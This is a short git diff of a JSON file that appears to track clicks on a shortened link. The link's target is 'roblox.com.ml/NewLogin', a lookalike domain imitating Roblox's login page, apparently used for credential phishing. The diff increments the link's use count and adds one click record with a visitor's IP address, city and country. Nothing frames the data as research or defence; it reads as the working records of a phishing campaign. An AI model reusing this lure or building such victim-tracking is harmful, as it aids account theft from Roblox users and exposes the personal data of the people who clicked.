@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 293,
+    "useCount": 294,
     "createdBy": "admin",
     "clicks": [
       {
@@ -2456,6 +2456,14 @@
         "city": "Budapest",
         "flag": "🇭🇺",
         "countryCode": "HU"
+      },
+      {
+        "timestamp": 1777012564055,
+        "ip": "113.189.197.119",
+        "country": "Vietnam",
+        "city": "Thắng",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
